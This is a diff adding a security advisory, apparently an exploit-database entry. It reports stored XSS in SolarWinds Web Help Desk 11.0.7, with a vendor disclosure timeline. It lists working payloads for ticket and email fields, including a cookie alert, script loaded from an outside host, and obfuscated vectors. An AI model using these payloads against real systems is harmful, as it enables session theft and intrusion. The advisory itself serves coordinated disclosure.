@@ -1,0 +1,44 @@
+# Author: loneferret of Offensive Security
+# Product: Web Help Desk by SolarWinds
+# Version: 11.0.7 (older versions may be affected)
+# Vendor Site: http://www.webhelpdesk.com
+# Software Download: http://www.webhelpdesk.com/help-desk-software/
+
+# Discovered: August 18th 2012
+# Disclosure:
+# August 19th 2012: Reported to CERT
+# August 24th 2012: Public disclosure date is October 8th 2012
+# August 28th 2012: Vendor responded, should fix by disclosure date
+# August 29th 2012: Vendor asked information on Stored XSS in 'Rejected E-Mail Section'
+# August 29th 2012: Sent vendor instructions on how to trigger XSS (not fully documented here)*
+# September 21 2012: Vendor sends pre-release version to test (11.0.8)
+# September 23 2012: Replied. Still XSS in "Rejected E-Mail Section' but not in Tickets
+# September 24 2012: Vendor replied saying "Rejected E-Mail" XSS slated to be fix in next version
+# October 8th 2012: Public release
+
+# Vulnerabilities:
+# Stored XSS via client web ticket submit system
+# Effected fields: Subject & Request Details
+# Payload: <script>alert(document.cookie);</script>
+
+# Stored XSS via E-Mail
+# Tickets created automatically vis e-mail will also trigger the XSS when viewing.
+# Following payloads are triggered with default regular expression filters 
+# Body field
+# Payloads:
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>  
+<iframe SRC="javascript:alert('XSS Body');"></iframe>
+
+# Subject field
+# Payloads:
+<BODY ONLOAD=alert('XSS')>**
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>  
+<iframe SRC="javascript:alert('XSS Subject');"></iframe>
+
+# *Viewing rejected e-mails via the 'email.eml' in the "Raw Message Data" section.
+# Some payloads:
+# <SCRIPT SRC=http://ha.ckers.org/xss.js>
+# <XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+
+# **To trigger XSS must click on "My Tickets" or "Group Tickets"
+
